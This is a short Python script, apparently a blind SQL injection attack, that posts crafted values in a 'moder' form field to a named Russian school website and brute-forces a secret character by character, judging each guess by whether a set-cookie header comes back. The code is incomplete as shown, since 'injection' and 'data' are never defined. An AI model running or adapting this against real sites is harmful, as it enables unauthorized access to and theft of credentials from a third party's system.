import requests
site = 'http://gymnasium-7.ru'
chars = '0123456789!@#$%^&*()abcdefghijklmnopqrstuvwsyzABCDEFGHIGKLMNOPQRSTUVWXYZ.,/|\;'":[]{}<>'
found = []
for i in range(1,35):
   for c in list(chars):
      data['moder'] = injection % (i,c)
      if requests.post(site, data).headers.get('set-cookie'):
         found.append(c)
